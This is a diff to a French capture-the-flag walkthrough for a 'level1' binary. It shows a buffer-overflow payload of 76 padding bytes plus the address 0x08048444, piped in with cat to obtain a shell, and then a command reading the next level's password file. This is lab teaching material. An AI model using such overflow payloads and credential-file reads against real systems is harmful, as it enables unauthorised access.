@@ -16,10 +16,10 @@ Avec objdump on trouve que l'adresse de run est 08048444.
 On se sert donc de python pour ecrire cette adresse en little endian avec 76 caracteres devant :
 	python -c "print 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb' + '\x44' + '\x84' + '\x04' + '\x08'"
 
-On ecrit cela dans un fichier dans /tmp :
-	python -c "print 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb' + '\x44' + '\x84' + '\x04' + '\x08'"	 > /tmp/a
 
-Puis on se sert de cat pour envoyer ça dans l'entree standard du programme tout en gardant cette entree ouverte pour pouvoir ecrir dans le shell qui nous sera donné.
+Pour executer le binaire avec le payload :
+cat <(python -c "print 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb' + '\x44' + '\x84' + '\x04' + '\x08'") - | ./level1
 
-cat /tmp/a -  | ./level1
+
+Puis :
 cat /home/user/level2/.pass
